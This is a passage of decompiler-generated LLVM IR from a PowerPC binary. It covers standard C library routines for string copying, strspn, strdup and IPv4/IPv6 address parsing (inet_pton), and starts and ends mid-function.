  store i1 %v3_1001351c, i1* %cr7_eq.global-to-local, align 1
  %v1_10013520 = add i32 %v0_1001350c, -1
  store i32 %v1_10013520, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_100135bc, label %dec_label_pc_1001352c

dec_label_pc_1001352c:                            ; preds = %dec_label_pc_1001351c
  %v1_1001352c = udiv i32 %arg2, 4
  store i32 %v1_1001352c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013534

dec_label_pc_10013534:                            ; preds = %dec_label_pc_10013534.dec_label_pc_10013534_crit_edge, %dec_label_pc_1001352c
  %v2_10013544 = phi i32 [ %v0_10013538.pre, %dec_label_pc_10013534.dec_label_pc_10013534_crit_edge ], [ %v1_10013520, %dec_label_pc_1001352c ]
  %v0_10013534 = load i32, i32* @r4, align 4
  %v1_10013534 = inttoptr i32 %v0_10013534 to i8*
  %v2_10013534 = load i8, i8* %v1_10013534, align 1
  %v1_10013538 = add i32 %v2_10013544, 1
  store i32 %v1_10013538, i32* %r9.global-to-local, align 4
  %v1_1001353c = add i32 %v2_10013544, 2
  store i32 %v1_1001353c, i32* %r7.global-to-local, align 4
  %v3_10013540 = icmp eq i8 %v2_10013534, 0
  store i1 %v3_10013540, i1* %cr7_eq.global-to-local, align 1
  %v4_10013544 = inttoptr i32 %v1_10013538 to i8*
  store i8 %v2_10013534, i8* %v4_10013544, align 1
  %v0_10013548 = load i32, i32* @r4, align 4
  %v1_10013548 = add i32 %v0_10013548, 1
  store i32 %v1_10013548, i32* %r11.global-to-local, align 4
  %v0_1001354c = load i32, i32* @lr, align 4
  %v1_1001354c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001354c, i32 %v0_1001354c)
  %v0_10013550 = load i32, i32* @r4, align 4
  %v1_10013550 = add i32 %v0_10013550, 1
  %v2_10013550 = inttoptr i32 %v1_10013550 to i8*
  %v3_10013550 = load i8, i8* %v2_10013550, align 1
  %v0_10013554 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013554 = add i32 %v0_10013554, 1
  store i32 %v1_10013554, i32* %r8.global-to-local, align 4
  %v0_10013558 = load i32, i32* %r7.global-to-local, align 4
  %v1_10013558 = add i32 %v0_10013558, 1
  store i32 %v1_10013558, i32* %r10.global-to-local, align 4
  %v3_1001355c = icmp eq i8 %v3_10013550, 0
  store i1 %v3_1001355c, i1* %cr7_eq.global-to-local, align 1
  %v2_10013560 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013560 = add i32 %v2_10013560, 1
  %v4_10013560 = inttoptr i32 %v3_10013560 to i8*
  store i8 %v3_10013550, i8* %v4_10013560, align 1
  %v0_10013564 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013564 = add i32 %v0_10013564, 1
  store i32 %v1_10013564, i32* %r9.global-to-local, align 4
  %v1_10013568 = add i32 %v0_10013564, 2
  store i32 %v1_10013568, i32* @r4, align 4
  %v0_1001356c = load i32, i32* @lr, align 4
  %v1_1001356c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001356c, i32 %v0_1001356c)
  %v0_10013570 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013570 = add i32 %v0_10013570, 1
  %v2_10013570 = inttoptr i32 %v1_10013570 to i8*
  %v3_10013570 = load i8, i8* %v2_10013570, align 1
  %v0_10013574 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013574 = add i32 %v0_10013574, 1
  store i32 %v1_10013574, i32* %r11.global-to-local, align 4
  %v3_10013578 = icmp eq i8 %v3_10013570, 0
  store i1 %v3_10013578, i1* %cr7_eq.global-to-local, align 1
  %v2_1001357c = load i32, i32* %r7.global-to-local, align 4
  %v3_1001357c = add i32 %v2_1001357c, 1
  %v4_1001357c = inttoptr i32 %v3_1001357c to i8*
  store i8 %v3_10013570, i8* %v4_1001357c, align 1
  %v0_10013580 = load i32, i32* @lr, align 4
  %v1_10013580 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013580, i32 %v0_10013580)
  %v0_10013584 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013584 = add i32 %v0_10013584, 1
  %v2_10013584 = inttoptr i32 %v1_10013584 to i8*
  %v3_10013584 = load i8, i8* %v2_10013584, align 1
  %v4_10013584 = zext i8 %v3_10013584 to i32
  store i32 %v4_10013584, i32* %r9.global-to-local, align 4
  %v3_10013588 = icmp eq i8 %v3_10013584, 0
  store i1 %v3_10013588, i1* %cr7_eq.global-to-local, align 1
  %v2_1001358c = load i32, i32* %r10.global-to-local, align 4
  %v3_1001358c = add i32 %v2_1001358c, 1
  %v4_1001358c = inttoptr i32 %v3_1001358c to i8*
  store i8 %v3_10013584, i8* %v4_1001358c, align 1
  %v0_10013590 = load i32, i32* @lr, align 4
  %v1_10013590 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013590, i32 %v0_10013590)
  %v0_10013594 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013594 = add i32 %v0_10013594, -1
  store i32 %v1_10013594, i32* %ctr.global-to-local, align 4
  %v2_10013594 = icmp eq i32 %v1_10013594, 0
  br i1 %v2_10013594, label %dec_label_pc_10013598, label %dec_label_pc_10013534.dec_label_pc_10013534_crit_edge

dec_label_pc_10013534.dec_label_pc_10013534_crit_edge: ; preds = %dec_label_pc_10013534
  %v0_10013538.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013534

dec_label_pc_10013598:                            ; preds = %dec_label_pc_10013534
  %v0_10013598 = load i32, i32* %r5.global-to-local, align 4
  %v1_10013598 = urem i32 %v0_10013598, 4
  store i32 %v1_10013598, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100135bc

dec_label_pc_100135a0:                            ; preds = %dec_label_pc_100135bc, %dec_label_pc_100135a0.dec_label_pc_100135a0_crit_edge
  %v0_100135a4 = phi i32 [ %v0_100135a4.pre, %dec_label_pc_100135a0.dec_label_pc_100135a0_crit_edge ], [ %v0_100135bc, %dec_label_pc_100135bc ]
  %v0_100135a0 = load i32, i32* @r4, align 4
  %v1_100135a0 = inttoptr i32 %v0_100135a0 to i8*
  %v2_100135a0 = load i8, i8* %v1_100135a0, align 1
  %v3_100135a0 = zext i8 %v2_100135a0 to i32
  store i32 %v3_100135a0, i32* %r9.global-to-local, align 4
  %v1_100135a4 = add i32 %v0_100135a4, -1
  store i32 %v1_100135a4, i32* %r5.global-to-local, align 4
  %v1_100135a8 = add i32 %v0_100135a0, 1
  store i32 %v1_100135a8, i32* @r4, align 4
  %v3_100135ac = icmp eq i8 %v2_100135a0, 0
  store i1 %v3_100135ac, i1* %cr7_eq.global-to-local, align 1
  %v2_100135b0 = load i32, i32* %r11.global-to-local, align 4
  %v3_100135b0 = add i32 %v2_100135b0, 1
  %v4_100135b0 = inttoptr i32 %v3_100135b0 to i8*
  store i8 %v2_100135a0, i8* %v4_100135b0, align 1
  store i32 %v3_100135b0, i32* %r11.global-to-local, align 4
  %v0_100135b4 = load i32, i32* @lr, align 4
  %v1_100135b4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100135b4, i32 %v0_100135b4)
  %v0_100135c4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100135c4 = add i32 %v0_100135c4, -1
  store i32 %v1_100135c4, i32* %ctr.global-to-local, align 4
  %v2_100135c4 = icmp eq i32 %v1_100135c4, 0
  br i1 %v2_100135c4, label %dec_label_pc_100135c8, label %dec_label_pc_100135a0.dec_label_pc_100135a0_crit_edge

dec_label_pc_100135a0.dec_label_pc_100135a0_crit_edge: ; preds = %dec_label_pc_100135a0
  %v0_100135a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100135a0

dec_label_pc_100135bc:                            ; preds = %dec_label_pc_1001351c, %dec_label_pc_10013598
  %v0_100135bc = phi i32 [ %arg2, %dec_label_pc_1001351c ], [ %v1_10013598, %dec_label_pc_10013598 ]
  store i32 %v0_100135bc, i32* %ctr.global-to-local, align 4
  %v2_100135c43 = icmp eq i32 %v0_100135bc, 0
  br i1 %v2_100135c43, label %dec_label_pc_100135c8, label %dec_label_pc_100135a0

dec_label_pc_100135c8:                            ; preds = %dec_label_pc_100135a0, %dec_label_pc_100135bc
  %v0_100135c8 = load i32, i32* %r9.global-to-local, align 4
  %v3_100135c8 = icmp eq i32 %v0_100135c8, 0
  store i1 %v3_100135c8, i1* %cr7_eq.global-to-local, align 1
  %v0_100135cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100135c8, i32 %v0_100135cc)
  %v0_100135d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100135d0 = trunc i32 %v0_100135d0 to i8
  %v2_100135d0 = load i32, i32* %r11.global-to-local, align 4
  %v3_100135d0 = add i32 %v2_100135d0, 1
  %v4_100135d0 = inttoptr i32 %v3_100135d0 to i8*
  store i8 %v1_100135d0, i8* %v4_100135d0, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_100135bc, { 1, 2, 0 }
  uselistorder i32 %v1_100135c4, { 1, 0 }
  uselistorder i32 %v1_10013598, { 1, 0 }
  uselistorder i32 %v1_10013594, { 1, 0 }
  uselistorder i32 %v2_10013544, { 1, 0 }
  uselistorder i32 %v1_10013510, { 1, 0 }
  uselistorder i32 %v0_1001350c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_100135c8, { 1, 0 }
  uselistorder label %dec_label_pc_100135bc, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100136081 = load i32, i32* @r3, align 4
  %v1_100136082 = inttoptr i32 %v0_100136081 to i8*
  %v2_100136083 = load i8, i8* %v1_100136082, align 1
  %v3_1001360c6 = icmp eq i8 %v2_100136083, 0
  br i1 %v3_1001360c6, label %dec_label_pc_1001361c, label %dec_label_pc_10013614

dec_label_pc_100135e4:                            ; preds = %dec_label_pc_100135e4, %dec_label_pc_10013614
  %v0_100135e4 = phi i32 [ %v1_100135e8, %dec_label_pc_100135e4 ], [ %tmp, %dec_label_pc_10013614 ]
  %v1_100135e4 = inttoptr i32 %v0_100135e4 to i8*
  %v2_100135e4 = load i8, i8* %v1_100135e4, align 1
  %v1_100135e8 = add i32 %v0_100135e4, 1
  %v3_100135ec = icmp eq i8 %v2_100135e4, 0
  %v4_100135f0 = icmp eq i8 %v0_100135f08.in, %v2_100135e4
  %brmerge = or i1 %v3_100135ec, %v4_100135f0
  br i1 %brmerge, label %dec_label_pc_100135f8, label %dec_label_pc_100135e4

dec_label_pc_100135f8:                            ; preds = %dec_label_pc_100135e4
  br i1 %v3_100135ec, label %dec_label_pc_1001361c, label %dec_label_pc_10013600

dec_label_pc_10013600:                            ; preds = %dec_label_pc_100135f8
  %v1_10013600 = add i32 %v0_10013600, 1
  %v1_10013604 = add i32 %v0_10013604, 1
  %v1_10013608 = inttoptr i32 %v1_10013604 to i8*
  %v2_10013608 = load i8, i8* %v1_10013608, align 1
  %v3_1001360c = icmp eq i8 %v2_10013608, 0
  br i1 %v3_1001360c, label %dec_label_pc_1001361c, label %dec_label_pc_10013614

dec_label_pc_10013614:                            ; preds = %entry, %dec_label_pc_10013600
  %v0_10013604 = phi i32 [ %v1_10013604, %dec_label_pc_10013600 ], [ %v0_100136081, %entry ]
  %v0_10013600 = phi i32 [ %v1_10013600, %dec_label_pc_10013600 ], [ 0, %entry ]
  %v0_100135f08.in = phi i8 [ %v2_10013608, %dec_label_pc_10013600 ], [ %v2_100136083, %entry ]
  br label %dec_label_pc_100135e4

dec_label_pc_1001361c:                            ; preds = %dec_label_pc_10013600, %dec_label_pc_100135f8, %entry
  %v0_1001361c = phi i32 [ 0, %entry ], [ %v1_10013600, %dec_label_pc_10013600 ], [ %v0_10013600, %dec_label_pc_100135f8 ]
  ret i32 %v0_1001361c

; uselistorder directives
  uselistorder i32 %v0_100135e4, { 1, 0 }
  uselistorder label %dec_label_pc_10013614, { 1, 0 }
  uselistorder label %dec_label_pc_100135e4, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10013638 = call i32 @__GI_strlen()
  %v1_1001363c = add i32 %v0_10013638, 1
  store i32 %v1_1001363c, i32* @r29, align 4
  store i32 %v1_1001363c, i32* @r3, align 4
  store i32 268514888, i32* @lr, align 4
  %v0_10013644 = call i32 @malloc()
  store i32 %v0_10013644, i32* @r3, align 4
  %v0_10013648 = load i32, i32* @r28, align 4
  store i32 %v0_10013648, i32* @r4, align 4
  store i32 %v0_10013644, i32* @r31, align 4
  %v3_1001364c = icmp eq i32 %v0_10013644, 0
  %v0_10013650 = load i32, i32* @r29, align 4
  store i32 %v0_10013650, i32* @r5, align 4
  br i1 %v3_1001364c, label %dec_label_pc_1001365c, label %dec_label_pc_10013658

dec_label_pc_10013658:                            ; preds = %entry
  store i32 268514908, i32* @lr, align 4
  %v0_10013658 = call i32 @memcpy()
  %v0_10013660.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001365c

dec_label_pc_1001365c:                            ; preds = %entry, %dec_label_pc_10013658
  %v0_10013660 = phi i32 [ 0, %entry ], [ %v0_10013660.pre, %dec_label_pc_10013658 ]
  ret i32 %v0_10013660

; uselistorder directives
  uselistorder i32 ()* @malloc, { 10, 7, 6, 15, 14, 9, 8, 4, 3, 13, 12, 11, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_1001365c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10013674 = load i32, i32* @lr, align 4
  store i32 %v0_10013674, i32* %r0.global-to-local, align 4
  %v0_1001367c = call i32 @__asm_mfcr()
  store i32 %v0_1001367c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10013688 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10013688, i32* %r7.global-to-local, align 4
  %v0_1001368c = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100136f4

dec_label_pc_100136a4:                            ; preds = %dec_label_pc_100136f4
  %v3_100136a4 = icmp eq i32 %v0_10013718, 4
  store i1 %v3_100136a4, i1* %cr7_eq.global-to-local, align 1
  %v0_100136a8 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_100136a8, label %dec_label_pc_100136e0, label %dec_label_pc_100136ac

dec_label_pc_100136ac:                            ; preds = %dec_label_pc_100136a4
  %v0_100136ac = load i32, i32* %r7.global-to-local, align 4
  %v1_100136ac = inttoptr i32 %v0_100136ac to i8*
  %v2_100136ac = load i8, i8* %v1_100136ac, align 1
  %v3_100136ac = zext i8 %v2_100136ac to i32
  %v1_100136b0 = mul nuw nsw i32 %v3_100136ac, 10
  %v1_100136b4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100136b4 = add i32 %v1_100136b0, %v1_100136b4
  %v1_100136b8 = add i32 %v2_100136b4, -48
  store i32 %v1_100136b8, i32* %r0.global-to-local, align 4
  %v2_100136bc = icmp ugt i32 %v1_100136b8, 255
  %v3_100136bc = icmp eq i32 %v1_100136b8, 255
  store i1 %v3_100136bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100136bc, label %dec_label_pc_1001373c, label %dec_label_pc_100136c4

dec_label_pc_100136c4:                            ; preds = %dec_label_pc_100136ac
  %v1_100136c4 = trunc i32 %v1_100136b8 to i8
  store i8 %v1_100136c4, i8* %v1_100136ac, align 1
  %v0_100136c8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_100136c8, label %dec_label_pc_100136cc, label %dec_label_pc_100136f4.backedge

dec_label_pc_100136cc:                            ; preds = %dec_label_pc_100136c4
  %v0_100136cc = load i32, i32* %r10.global-to-local, align 4
  %v1_100136cc = add i32 %v0_100136cc, 1
  store i32 %v1_100136cc, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_100136d4 = icmp sgt i32 %v1_100136cc, 4
  %v3_100136d4 = icmp eq i32 %v1_100136cc, 4
  store i1 %v3_100136d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100136d4, label %dec_label_pc_1001373c, label %dec_label_pc_100136f4.backedge

dec_label_pc_100136e0:                            ; preds = %dec_label_pc_100136a4
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_100136e4 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_100136e4.not = xor i1 %v0_100136e4, true
  %v0_100136e8 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_100136a4, %v0_100136e8
  %or.cond = or i1 %brmerge, %v0_100136e4.not
  br i1 %or.cond, label %dec_label_pc_1001373c, label %dec_label_pc_100136f0

dec_label_pc_100136f0:                            ; preds = %dec_label_pc_100136e0
  %v0_100136f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_100136f0 = trunc i32 %v0_100136f0 to i8
  %v2_100136f0 = load i32, i32* %r7.global-to-local, align 4
  %v3_100136f0 = add i32 %v2_100136f0, 1
  %v4_100136f0 = inttoptr i32 %v3_100136f0 to i8*
  store i8 %v1_100136f0, i8* %v4_100136f0, align 1
  store i32 %v3_100136f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100136f4.backedge

dec_label_pc_100136f4.backedge:                   ; preds = %dec_label_pc_100136f0, %dec_label_pc_100136c4, %dec_label_pc_100136cc
  %v0_100136f4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100136f8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100136f4

dec_label_pc_100136f4:                            ; preds = %dec_label_pc_100136f4.backedge, %entry
  %v0_100136f8 = phi i32 [ %v0_100136f8.pre, %dec_label_pc_100136f4.backedge ], [ 0, %entry ]
  %v0_100136fc = phi i32 [ %v0_100136f4.pre, %dec_label_pc_100136f4.backedge ], [ %v0_1001367c, %entry ]
  %v1_100136f4 = inttoptr i32 %v0_100136fc to i8*
  %v2_100136f4 = load i8, i8* %v1_100136f4, align 1
  %v3_100136f4 = zext i8 %v2_100136f4 to i32
  store i32 %v3_100136f4, i32* %r11.global-to-local, align 4
  %v3_100136f8 = icmp eq i32 %v0_100136f8, 0
  store i1 %v3_100136f8, i1* %cr4_eq.global-to-local, align 1
  %v1_100136fc = add i32 %v0_100136fc, 1
  store i32 %v1_100136fc, i32* %r3.global-to-local, align 4
  %v3_10013700 = icmp eq i8 %v2_100136f4, 0
  store i1 %v3_10013700, i1* %cr7_eq.global-to-local, align 1
  %v1_10013704 = add nsw i32 %v3_100136f4, -48
  store i32 %v1_10013704, i32* %r0.global-to-local, align 4
  %v2_10013708 = icmp ugt i32 %v1_10013704, 9
  store i1 %v2_10013708, i1* %cr6_gt.global-to-local, align 1
  %v3_1001370c = icmp eq i8 %v2_100136f4, 46
  store i1 %v3_1001370c, i1* %cr1_eq.global-to-local, align 1
  %v0_10013710 = load i4, i4* @cr4, align 1
  %v1_10013710 = call %2 @__asm_mcrf_cr0_write(i4 %v0_10013710)
  %v4_10013710 = extractvalue %2 %v1_10013710, 2
  store i1 %v4_10013710, i1* %cr0_eq.global-to-local, align 1
  %v0_10013714 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_10013718 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10013714, label %dec_label_pc_10013718, label %dec_label_pc_100136a4

dec_label_pc_10013718:                            ; preds = %dec_label_pc_100136f4
  %v3_10013718 = icmp eq i32 %v0_10013718, 3
  store i1 %v3_10013718, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_10013718, 4
  br i1 %tmp9, label %dec_label_pc_1001373c, label %dec_label_pc_10013720

dec_label_pc_10013720:                            ; preds = %dec_label_pc_10013718
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10013688, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013730.708 to i32), i32* @lr, align 4
  %v0_1001372c = call i32 @memcpy()
  br label %dec_label_pc_1001373c

dec_label_pc_1001373c:                            ; preds = %dec_label_pc_100136e0, %dec_label_pc_100136ac, %dec_label_pc_100136cc, %dec_label_pc_10013718, %dec_label_pc_10013720
  %storemerge = phi i32 [ 1, %dec_label_pc_10013720 ], [ 0, %dec_label_pc_10013718 ], [ 0, %dec_label_pc_100136cc ], [ 0, %dec_label_pc_100136ac ], [ 0, %dec_label_pc_100136e0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1001368c, i32* %r0.global-to-local, align 4
  %v1_1001374c = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001367c)
  %v4_1001374c = extractvalue %0 %v1_1001374c, 2
  store i1 %v4_1001374c, i1* %cr0_eq.global-to-local, align 1
  %v9_1001374c = extractvalue %0 %v1_1001374c, 7
  store i4 %v9_1001374c, i4* @cr4, align 1
  %v0_10013750 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013750

; uselistorder directives
  uselistorder i32 %v1_100136cc, { 1, 0, 2 }
  uselistorder i32 %v1_100136b8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1001367c, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 7, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1001373c, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_100136f4.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10013754 = icmp eq i32 %arg1, 2
  %v0_10013758 = load i32, i32* @lr, align 4
  store i32 %v0_10013758, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_10013754, label %dec_label_pc_10013780, label %dec_label_pc_10013774

dec_label_pc_10013774:                            ; preds = %entry
  %v3_10013774 = icmp eq i32 %arg1, 10
  br i1 %v3_10013774, label %dec_label_pc_10013794, label %dec_label_pc_10013930

dec_label_pc_10013780:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268515212, i32* @lr, align 4
  %v3_10013788 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10013788, i32* %r3.global-to-local, align 4
  store i32 %v3_10013788, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013948

dec_label_pc_10013794:                            ; preds = %dec_label_pc_10013774
  %v2_10013794 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013794, i32* %r3.global-to-local, align 4
  store i32 268515236, i32* @lr, align 4
  %v3_100137a0 = call i32 @__GI_memset(i32 %v2_10013794, i32 0, i32 16)
  store i32 %v3_100137a0, i32* %r3.global-to-local, align 4
  %v0_100137a4 = load i32, i32* @r29, align 4
  %v1_100137a4 = inttoptr i32 %v0_100137a4 to i8*
  %v2_100137a4 = load i8, i8* %v1_100137a4, align 1
  %v3_100137a4 = zext i8 %v2_100137a4 to i32
  store i32 %v3_100137a4, i32* %r0.global-to-local, align 4
  store i32 %v3_100137a0, i32* @r31, align 4
  %v2_100137ac = add i32 %v3_100137a0, 16
  store i32 %v2_100137ac, i32* @r27, align 4
  %v3_100137b0 = icmp eq i8 %v2_100137a4, 58
  br i1 %v3_100137b0, label %dec_label_pc_100137b8, label %dec_label_pc_100137c4

dec_label_pc_100137b8:                            ; preds = %dec_label_pc_10013794
  %v1_100137b8 = add i32 %v0_100137a4, 1
  %v2_100137b8 = inttoptr i32 %v1_100137b8 to i8*
  %v3_100137b8 = load i8, i8* %v2_100137b8, align 1
  %v4_100137b8 = zext i8 %v3_100137b8 to i32
  store i32 %v4_100137b8, i32* %r0.global-to-local, align 4
  store i32 %v1_100137b8, i32* @r29, align 4
  %v3_100137bc = icmp eq i8 %v3_100137b8, 58
  br i1 %v3_100137bc, label %dec_label_pc_100137c4, label %dec_label_pc_10013944

dec_label_pc_100137c4:                            ; preds = %dec_label_pc_100137b8, %dec_label_pc_10013794
  %v0_100137c4 = phi i32 [ %v1_100137b8, %dec_label_pc_100137b8 ], [ %v0_100137a4, %dec_label_pc_10013794 ]
  store i32 %v0_100137c4, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_100138983036 = inttoptr i32 %v0_100137c4 to i8*
  %v2_100138983137 = load i8, i8* %v1_100138983036, align 1
  %v3_100138983238 = zext i8 %v2_100138983137 to i32
  store i32 %v3_100138983238, i32* %r3.global-to-local, align 4
  store i32 268515488, i32* @lr, align 4
  %v1_1001389c3339 = call i32 @__GI_tolower(i32 %v3_100138983238)
  store i32 %v1_1001389c3339, i32* %r3.global-to-local, align 4
  store i32 %v1_1001389c3339, i32* @r30, align 4
  %v3_100138a03440 = icmp eq i32 %v1_1001389c3339, 0
  br i1 %v3_100138a03440, label %dec_label_pc_100138a8, label %dec_label_pc_100137d0.lr.ph

dec_label_pc_100137d0:                            ; preds = %dec_label_pc_100137d0.lr.ph, %dec_label_pc_10013898.backedge
  %v1_1001389c35 = phi i32 [ %v1_1001389c3341, %dec_label_pc_100137d0.lr.ph ], [ %v1_1001389c, %dec_label_pc_10013898.backedge ]
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10017ba8.709 to i32), i32* @r25, align 4
  %v0_100137dc = load i32, i32* @r29, align 4
  %v1_100137dc = add i32 %v0_100137dc, 1
  store i32 %v1_100137dc, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10017ba8.709 to i32), i32* @r3, align 4
  store i32 268515304, i32* @lr, align 4
  %v3_100137e4 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_10017ba8.709 to i32), i32 %v1_1001389c35)
  store i32 %v3_100137e4, i32* %r3.global-to-local, align 4
  %v3_100137e8 = icmp eq i32 %v3_100137e4, 0
  br i1 %v3_100137e8, label %dec_label_pc_10013808, label %dec_label_pc_100137f0

dec_label_pc_100137f0:                            ; preds = %dec_label_pc_100137d0
  %v0_100137f0 = load i32, i32* @r25, align 4
  %v2_100137f0 = sub i32 %v3_100137e4, %v0_100137f0
  store i32 %v2_100137f0, i32* %r0.global-to-local, align 4
  %v0_100137f4 = load i32, i32* @r28, align 4
  %v1_100137f4 = mul i32 %v0_100137f4, 16
  store i32 %v1_100137f4, i32* %r9.global-to-local, align 4
  %v2_100137f8 = or i32 %v1_100137f4, %v2_100137f0
  store i32 %v2_100137f8, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_100137f8, 65536
  br i1 %tmp19, label %dec_label_pc_10013894, label %dec_label_pc_10013944

dec_label_pc_10013808:                            ; preds = %dec_label_pc_100137d0
  %v0_10013808 = load i32, i32* @r30, align 4
  %v3_10013808 = icmp eq i32 %v0_10013808, 58
  br i1 %v3_10013808, label %dec_label_pc_10013810, label %dec_label_pc_10013864

dec_label_pc_10013810:                            ; preds = %dec_label_pc_10013808
  %v0_10013810 = load i32, i32* @r23, align 4
